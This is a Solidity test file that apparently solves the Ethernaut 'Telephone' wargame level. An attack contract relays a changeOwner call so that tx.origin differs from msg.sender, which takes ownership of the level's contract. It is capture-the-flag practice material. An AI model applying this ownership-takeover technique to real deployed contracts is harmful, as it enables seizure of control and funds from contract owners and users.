// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract TelephoneAttack {
  ITelephone internal challenge;

  constructor(address _challengeAddress) {
    challenge = ITelephone(_challengeAddress);
  }

  function attack() public {
    challenge.changeOwner(msg.sender);
  }
}

contract TelephoneTest is Test {
  address internal challengeAddress;
  TelephoneAttack internal attackContract;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446);
    attackContract = new TelephoneAttack(challengeAddress);
  }

  function testExploit() public {
    attackContract.attack();
    utils.submitLevelInstance(challengeAddress);
  }
}
